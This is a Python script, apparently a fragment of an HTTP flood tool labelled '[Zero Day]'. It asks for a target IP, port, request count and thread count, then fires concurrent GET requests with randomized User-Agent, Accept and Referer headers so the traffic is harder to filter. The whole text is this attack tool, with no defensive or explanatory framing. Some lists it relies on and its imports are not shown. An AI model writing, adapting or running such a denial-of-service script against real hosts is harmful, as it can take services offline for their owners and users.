ip = str(input('[Zero Day] IP: '))
port = int(input('[Zero Day] PORT: '))
pack = int(input('[Zero Day] P/S: '))
thread = int(input('[Zero Day] THREADS: '))

async def fetch(url, session_id):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                "User-Agent": random.choice(useragents),
                "Accept": random.choice(acceptall),
                "Referer": random.choice(ref) + str(ip),
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "0",
                "Connection": "Keep-Alive"
            }
            
            async with session.get(url, headers=headers) as response:
                await response.text()
                print(f"Session {session_id}: Sent a request to {url}")
    except Exception as e:
        print(f"Session {session_id} encountered an error: {e}")

async def start_attack(url, session_id):
    try:
        async with aiohttp.ClientSession() as session:
            for _ in range(pack):
                await fetch(url, session_id)
    except Exception as e:
        print(f"Session {session_id} encountered an error: {e}")

async def main():
    try:
        tasks = []
        url = f"http://{ip}:{port}/"
        for i in range(thread):
            task = asyncio.create_task(start_attack(url, i+1))
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"An error occurred in the main function: {e}")

if __name__ == "__main__":
    asyncio.run(main())